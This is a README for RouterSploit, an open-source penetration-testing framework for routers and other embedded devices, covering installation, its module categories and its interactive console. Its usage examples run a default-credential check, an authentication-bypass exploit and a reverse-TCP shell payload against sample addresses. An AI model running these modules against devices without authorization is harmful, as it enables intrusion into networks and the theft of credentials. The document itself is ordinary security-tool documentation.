# RouterSploit - Exploitation Framework for Embedded Devices

[![Python 3.6+](https://img.shields.io/badge/Python-3.6%2B-green.svg)](http://www.python.org/download/)
[![Build Status](https://travis-ci.org/threat9/routersploit.svg?branch=master)](https://travis-ci.org/threat9/routersploit)
[![Modules](https://img.shields.io/badge/Modules-489-blue.svg)]()
[![Exploits](https://img.shields.io/badge/Exploits-194-red.svg)]()
[![Vendors](https://img.shields.io/badge/Vendors-29-orange.svg)]()

# Community
Join community on [Embedded Exploitation Discord](https://discord.gg/UCXARN2vBx).

# Quick Start

## Basic Usage
```bash
# Launch the framework
python3 rsf.py

# Example: Test for default credentials
rsf > use creds/routers/asus/ssh_default_creds
rsf (SSH Default Creds) > set target 192.168.1.1
rsf (SSH Default Creds) > run

# Example: Exploit a vulnerability  
rsf > use exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure
rsf (Mikrotik WinBox Auth Bypass) > set target 192.168.1.1
rsf (Mikrotik WinBox Auth Bypass) > run

# Example: Generate payload
rsf > use payloads/mipsle/reverse_tcp
rsf (MIPSLE Reverse TCP) > set lhost 10.0.0.100
rsf (MIPSLE Reverse TCP) > set lport 4444
rsf (MIPSLE Reverse TCP) > run
```

## Command-line Usage
```bash
# Run specific module from command line
python3 rsf.py -m exploits/routers/asus/asuswrt_lan_rce -s "target 192.168.1.1"
```

# Description
The RouterSploit Framework is an open-source exploitation framework dedicated to embedded devices.

[![asciicast](https://asciinema.org/a/180370.png)](https://asciinema.org/a/180370)

## Framework Overview
RouterSploit provides a comprehensive toolkit for penetration testing embedded devices with **489 modules** across **29 vendor families**, making it one of the most extensive router security frameworks available.

### Module Categories
* **exploits** (194 modules) - Target-specific vulnerability exploits for embedded devices
* **creds** (228 modules) - Credential testing modules for default and weak passwords  
* **scanners** (8 modules) - Automated vulnerability detection and device fingerprinting
* **payloads** (42 modules) - Shellcode generation for multiple architectures
* **generic** (4 modules) - Universal attack modules for common services
* **encoders** (6 modules) - Payload encoding and evasion techniques

### Supported Architectures
* **ARM** (Little Endian) - ARM-based routers and IoT devices
* **MIPS** (Big/Little Endian) - MIPS processors commonly found in routers
* **x86/x64** - Intel-compatible embedded systems
* **Generic** - Architecture-independent exploits

### Supported Vendor Families
ASUS, Belkin, Billion, Cisco, Comtrend, D-Link, Fortinet, Huawei, Linksys, Mikrotik, Netgear, TP-Link, Ubiquiti, ZTE, Zyxel, and 14+ additional vendors. 

# Installation

## System Requirements
* **OS**: Linux (Kali, Ubuntu, Debian), macOS, Windows (WSL)
* **Python**: 3.6+ (tested up to 3.12)
* **Memory**: 512MB RAM minimum
* **Storage**: 100MB free space

## Requirements

Required:
* requests
* paramiko
* pysnmp
* pycryptodome

Optional:
* bluepy - Bluetooth low energy support 

## Installation on Kali Linux

```
apt-get install python3-pip
git clone https://www.github.com/threat9/routersploit
cd routersploit
python3 -m pip install -r requirements.txt
python3 rsf.py
```

Bluetooth Low Energy support:
```
apt-get install libglib2.0-dev
python3 -m pip install bluepy
python3 rsf.py
```

## Installation on Ubuntu 20.04

```
sudo apt-get install git python3-pip
git clone https://github.com/threat9/routersploit
cd routersploit
python3 -m pip install -r requirements.txt
python3 rsf.py
```

Bluetooth Low Energy support:

```
sudo apt-get install libglib2.0-dev
python3 -m pip install bluepy
python3 rsf.py
```

## Installation on Ubuntu 18.04 & 17.10

```
sudo add-apt-repository universe
sudo apt-get install git python3-pip
git clone https://www.github.com/threat9/routersploit
cd routersploit
python3 -m pip install setuptools
python3 -m pip install -r requirements.txt
python3 rsf.py
```

Bluetooth Low Energy support:
```
apt-get install libglib2.0-dev
python3 -m pip install bluepy
python3 rsf.py
```


## Installation on OSX

```
git clone https://www.github.com/threat9/routersploit
cd routersploit
sudo python3 -m pip install -r requirements.txt
python3 rsf.py
```

## Running on Docker

```
git clone https://www.github.com/threat9/routersploit
cd routersploit
docker compose up --build -d
docker attach routersploit
```
### To run again without rebuild

```
docker start routersploit
docker attach routersploit
```

# Update

Update RouterSploit Framework often. The project is under heavy development and new modules are shipped almost every day.

```
cd routersploit
git pull
```

## Troubleshooting

### Common Issues
* **ImportError**: Ensure all dependencies are installed with `python3 -m pip install -r requirements.txt`
* **Permission denied**: Use `sudo` for system-wide installation or install to user directory
* **Module not found**: Verify Python path and that you're in the correct directory
* **Network timeouts**: Check target connectivity and firewall rules

### Performance Optimization  
* Use SSD storage for faster module loading
* Increase system file descriptor limits for concurrent scanning
* Consider running on dedicated penetration testing distributions

### Getting Help
* Check the [Documentation](docs/) for detailed module usage
* Search existing [Issues](https://github.com/threat9/routersploit/issues) 
* Join the [Discord Community](https://discord.gg/UCXARN2vBx) for support
* Review [CONTRIBUTING.md](CONTRIBUTING.md) for development guidelines

## Security Disclaimer

⚠️ **IMPORTANT**: RouterSploit is intended for authorized penetration testing and security research only. 

**Legal Usage Requirements:**
* Only test systems you own or have explicit written permission to test
* Comply with all applicable local, state, and federal laws
* Follow responsible disclosure practices for discovered vulnerabilities
* Use defensive techniques to verify and remediate security issues

**The developers assume no liability for misuse or damage caused by this framework.**

# Build your own
To our surprise, people started to fork 
[routersploit](https://github.com/threat9/routersploit) not because they were 
interested in the security of embedded devices but simply because they want to 
leverage our interactive shell logic and build their tools using similar 
concept. All these years they must have said: _"There must be a better way!"_ 
and they were completely right, the better way is called 
[_Riposte_](https://github.com/fwkz/riposte).

[_Riposte_](https://github.com/fwkz/riposte) allows you to easily wrap your 
application inside a tailored interactive shell. Common chores regarding 
building REPLs was factored out and being taken care of so you can 
focus on specific domain logic of your application.

## Future Enhancements

RouterSploit continues to evolve with the embedded security landscape. Planned improvements include:

### Short-term Goals
* **Enhanced IoT Support**: Additional modules for smart home devices and industrial IoT
* **AI-Powered Scanning**: Machine learning integration for intelligent vulnerability detection  
* **Mobile Device Testing**: Extended support for Android and iOS router management apps
* **Cloud Router Support**: Modules for cloud-managed networking infrastructure

### Medium-term Goals  
* **Protocol Fuzzing**: Built-in protocol fuzzing capabilities for proprietary router protocols
* **Automated Reporting**: Professional-grade vulnerability reports and remediation guidance
* **Plugin Architecture**: Enhanced extensibility framework for custom module development
* **Performance Optimization**: Multi-threaded scanning and improved memory efficiency

### Long-term Vision
* **Zero-Day Research**: Advanced vulnerability research tools and methodologies
* **Integration APIs**: RESTful APIs for integration with security orchestration platforms
* **GUI Interface**: Optional graphical interface for less technical users
* **Enterprise Features**: Role-based access, audit logging, and compliance reporting

### Contributing New Features
We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on:
* Creating new exploit modules
* Adding vendor support  
* Improving scanner capabilities
* Enhancing payload generation
* Documentation improvements

**Current Development Priorities:**
1. Python 3.12+ compatibility enhancements
2. Bluetooth Low Energy (BLE) attack modules  
3. IPv6 support for modern network environments
4. Container and microservice security testing
5. Enhanced evasion and anti-detection techniques
# License

The RouterSploit Framework is under a BSD license.
Please see [LICENSE](LICENSE) for more details.

# Acknowledgments
* [riposte](https://github.com/fwkz/riposte) - Interactive shell framework
* The security research community for vulnerability discoveries and responsible disclosure
* All contributors who have helped improve RouterSploit with modules, bug fixes, and documentation

---

**RouterSploit Framework v3.4.7** - Exploitation Framework for Embedded Devices  
*Codename: "I Knew You Were Trouble"*
